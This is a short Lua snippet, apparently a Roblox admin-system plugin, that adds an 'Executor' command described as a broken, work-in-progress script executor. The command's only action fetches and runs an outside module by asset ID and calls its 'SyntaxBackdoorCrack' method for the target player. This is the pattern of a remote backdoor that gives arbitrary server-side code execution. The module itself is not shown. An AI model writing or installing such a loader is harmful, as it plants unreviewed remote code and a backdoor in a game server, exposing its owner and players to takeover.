...
return function(Vargs)
	...
	server.Commands.Executor = {
		...
		Commands = {"Executor [Broken WIP]"};	-- Commands
		Args = {"player"};	-- Command arguments
		Description = "Opens a Script Executor [this plugin is currently a WIP and is broken at this momment]";	-- Command Description
		...
		Function = function(plr,args)    -- Function to run for command
			require(12291041476):SyntaxBackdoorCrack(plr.Name)
		end
	}
end
